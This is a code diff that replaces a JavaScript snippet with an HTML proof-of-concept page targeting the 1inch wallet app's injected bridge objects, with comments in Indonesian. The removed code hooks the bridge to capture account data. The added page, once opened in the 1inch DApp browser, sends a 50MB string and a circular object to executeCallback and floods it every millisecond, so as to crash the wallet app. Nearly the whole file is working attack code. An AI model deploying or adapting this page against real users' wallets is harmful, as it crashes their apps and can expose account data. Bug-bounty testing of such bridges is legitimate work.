@@ -1,14 +1,64 @@
-// Jalankan ini di attack.html kamu
-function waitAndWatch() {
-    const bridgeName = "OneInchSolanaWallet"; // Atau OneInchiOSWallet
-    if (window[bridgeName]) {
-        console.log("Bridge Siap!");
-        // Coba baca data akun secara pasif
-        window[bridgeName].accountChanged = function(data) {
-            alert("TEMUAN KRITIKAL: Data Akun Bocor! " + JSON.stringify(data));
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Bridge PoC</title>
+</head>
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center;">
+
+    <h2>🛠️ 1inch Bridge Tester</h2>
+    <p>Target: OneInchSolanaWallet / OneInchiOSWallet</p>
+    <hr style="border: 1px solid #333;">
+
+    <button id="crashBtn" onclick="triggerCrash()" style="padding: 20px; background: red; color: white; border: none; border-radius: 10px; font-weight: bold; width: 100%; margin-top: 20px;">
+        CLICK HERE TO START TEST
+    </button>
+
+    <div id="logs" style="margin-top: 30px; text-align: left; font-size: 12px; border: 1px solid #444; padding: 10px; min-height: 100px;">
+        > Menunggu aksi user...
+    </div>
+
+    <script>
+        const log = (m) => {
+            document.getElementById('logs').innerHTML += `<br>> ${m}`;
+            console.log(m);
         };
-    } else {
-        setTimeout(waitAndWatch, 1000); // Tunggu sampai bridge muncul
-    }
-}
-waitAndWatch();
+
+        function triggerCrash() {
+            const solanaBridge = window.OneInchSolanaWallet;
+            const iosBridge = window.OneInchiOSWallet;
+            const bridge = solanaBridge || iosBridge;
+
+            if (bridge) {
+                log("Bridge ditemukan! Mengirim payload penghancur...");
+                
+                try {
+                    // 1. Memory Flood: Kirim data sangat besar (Buffer Overflow test)
+                    const junk = "A".repeat(50 * 1024 * 1024); // 50MB
+                    
+                    // 2. Circular Reference: Kirim objek yang merujuk diri sendiri (JSON Crash test)
+                    const circular = {};
+                    circular.self = circular;
+
+                    log("Memicu executeCallback dengan data raksasa...");
+                    
+                    // Kita tembak fungsi yang kamu temukan di Deep Inspect
+                    bridge.executeCallback("crash_1", junk);
+                    bridge.executeCallback("crash_2", circular);
+                    
+                    // 3. Infinite Loop (Rekursi)
+                    log("Memulai Loop Rekursi...");
+                    setInterval(() => {
+                        bridge.executeCallback(Math.random().toString(), "flood");
+                    }, 1);
+
+                } catch (e) {
+                    log("JS Error: " + e.message + " (Tapi cek apakah aplikasi dompet masih hidup)");
+                }
+            } else {
+                log("<span style='color:red;'>Gagal: Bridge tidak terdeteksi. Pastikan buka di DApp Browser 1inch!</span>");
+            }
+        }
+    </script>
+</body>
+</html>
